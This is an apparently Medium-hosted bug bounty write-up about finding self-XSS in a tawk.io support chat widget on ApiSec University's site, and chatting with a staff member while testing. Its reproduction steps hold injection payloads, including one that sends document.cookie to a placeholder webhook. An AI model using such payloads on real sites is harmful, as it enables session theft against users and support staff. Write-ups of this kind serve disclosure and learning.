# Blind XSS

- **Source URL:** https://medium.com/@negan0/blind-xss-a-tale-of-curiosity-501d47c0256c?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@negan0
- **Fetched:** 2026-11-17
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 9314)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Hello,

In this article, I want to share an incident that happened to me.

I came across a post by Dan Barahona on LinkedIn and noticed that ApiSec University was offering the APIsec Certified Practitioner (ACP) certification exam for free. I found it very interesting and decided to register.

To prepare for the exam, I began studying API security using the courses available on their website. While exploring the site, I noticed a support chat feature in the lower-right corner. Out of curiosity, I tested a few things and discovered a Cross-Site Scripting (**XSS**) vulnerability in the chat system.

However, I couldn’t determine if it was just **self-XSS** or something more, as the chat displayed the message, “Sorry, all of our agents are busy.” This suggested there was no human available to view my **XSS** payload, leaving me uncertain about its potential impact.

Even so, I started drafting a report for them, mentioning, “It could be blind XSS. It would be better if you investigated this vulnerability.” However, I decided not to send the report.

A part of my Report where i was showing How can you reproduce :

### Steps to Reproduce:

1. First I Opened the website and navigate to the support chat widget (in the right corner of the page).
2. I checked that can i inject html tags, gived input like this:

'">\<u>negan

3\. I saw that i can inject html tags, so from here i tried **XSS** payload that alerts 1 to see can i succesfully run script:

\<img src onerror=alert(1)>

4\. Well we can perform XSS now let’s try to Submit the following payload via the chat input:

`<img src=x onerror="fetch('Your-webhook-URL-here',{method:'POST',body:document.cookie})">`
5\. The payload executes immediately within our browser session and sends user’s cookies to the webhook site.

6\. The chat interface might show “*All agents are busy*,” and nobody interacts with our payload, but if any support staff later views the message on their side, the script would execute in their browser as well. And send their cookie to my webhook site too.

The next day, I revisited the site and tested my **XSS** payload again — it was still working. This time, someone responded to me:

— “Did your injection work?”

Excited to finally have someone on the other end, I realized I had the chance to test my payload properly. The person responding was Jess Freeman.

We began chatting, and I explained, “I have no intention of causing harm to the site — I’m just interested in bug bounty hunting.”

He replied that he used to be a bug bounty hunter himself. Encouraged by this, I started sending my payloads and asked him, “Did you see an alert?”. He was very good guy I want to thank him, He was sending me payloads and saying try this payload ;)

On my side, the **XSS** was triggering, but on his side, nothing happened. This was a bit disappointing, as it confirmed the issue was only **self-XSS**. But Jess mentioned that the chat function wasn’t part of their system; they were using a service from tawk.io. He suggested I send my report to them, as it was possible that my payloads were executing on their side.

I submitted my report to **tawk.io**, but unfortunately, I didn’t receive any response.

If you visit the site now, you’ll notice they’ve replaced the chat function — there’s no longer a real human on the other end, just an AI assistant. Unfortunately, I can’t talk to Jess anymore ;( However, the self-XSS issue still exists, and I hope tawk.io solve it soon.

Despite this, the experience was incredibly interesting and a valuable learning opportunity for me. So, I decided to share this experience and thank Jess Freeman for being so understanding.
